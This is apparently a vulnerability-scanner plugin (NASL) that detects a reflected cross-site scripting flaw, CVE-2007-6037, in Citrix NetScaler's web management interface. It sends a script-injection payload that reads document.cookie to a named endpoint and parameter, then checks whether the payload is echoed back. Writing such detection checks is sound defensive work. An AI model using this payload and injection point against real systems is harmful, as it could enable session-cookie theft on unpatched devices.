# SPDX-FileCopyrightText: 2008 nnposter
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:citrix:netscaler";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80027");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2008-10-24 20:15:31 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("NetScaler Web Management 'CVE-2007-6037' XSS Vulnerability");

  script_family("Web application abuses");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");

  script_cve_id("CVE-2007-6037");
  script_xref(name:"OSVDB", value:"39009");

  script_copyright("Copyright (C) 2008 nnposter");
  script_dependencies("gb_citrix_netscaler_consolidation.nasl");
  script_mandatory_keys("citrix/netscaler/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"summary", value:"The remote Citrix NetScaler web management interface is
  susceptible to a cross-site scripting (XSS) vulnerability.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/483920/100/0/threaded");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/26491");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("url_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

xss = "</script><script>alert(document.cookie)</script><script>";
url = "/ws/generic_api_call.pl?function=statns&standalone=" + urlencode(str:xss);

resp = http_keepalive_send_recv(port: port, data: http_get(item: url,port: port), embedded:TRUE);
if (!resp || xss >!< resp)
  exit(99);

report = "The following URLs have been found vulnerable :\n\n" +
         ereg_replace(string:url,pattern:"\?.*$",replace:"");

security_message(port: port, data: report);

exit(0);
